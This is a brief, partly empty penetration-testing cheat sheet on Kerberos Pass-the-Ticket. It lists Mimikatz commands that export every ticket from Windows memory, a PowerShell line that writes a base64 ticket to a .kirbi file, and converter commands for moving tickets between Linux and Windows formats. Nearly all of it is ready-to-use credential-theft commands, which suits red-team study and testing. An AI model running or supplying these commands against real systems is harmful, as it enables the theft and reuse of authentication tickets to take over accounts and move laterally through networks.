# Pass The Ticket - Ticket Dump
## Retrieve tickets from Linux


## Retrieve tickets from Windows
User can request owned tickets, admin can request all.
`Mimikatz`
	sekurlsa::tickets /export
	exit
`Rubeus`
`\[IO.File\]::WriteAllBytes("ticket.kirbi", \[Convert\]::FromBase64String("<BASE64\_TICKET>"))`

## Swapping tickets between Linux-Windows
`python ticket_converter.py <LINUX.ccache> <WINDOWS.kirbi>`
`python ticket_converter.py <WINDOWS.kirbi> <LINUX.ccache>`